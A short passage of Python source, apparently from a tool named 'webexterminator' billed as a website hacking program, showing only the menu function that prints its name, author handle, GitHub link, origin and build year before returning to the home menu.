#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def info():
  banner()
  time.sleep(2)
  print("\t\t\t\t\t Program Name: webexterminator\n \t\t\t\t\t Manufacturer Name: mts 3113\n \t\t\t\t\t GateHub address: https://github.com/Hackermts3113 \n \t\t\t\t\t Application: Website hacking\n \t\t\t\t\t Country Name: Iran \n \t\t\t\t\t Built in: 2021 \n \t\t\t\t\t Written in the Python programming language\n\n \t\t\t\t\t\t\t ******************** \n\t\t\t\t\t\t\t * web exterminator * \n \t\t\t\t\t\t\t ******************** "+Fore.BLUE)
  Fore.RED
  input("\n (((!))) back ")
  home()

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
home()
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@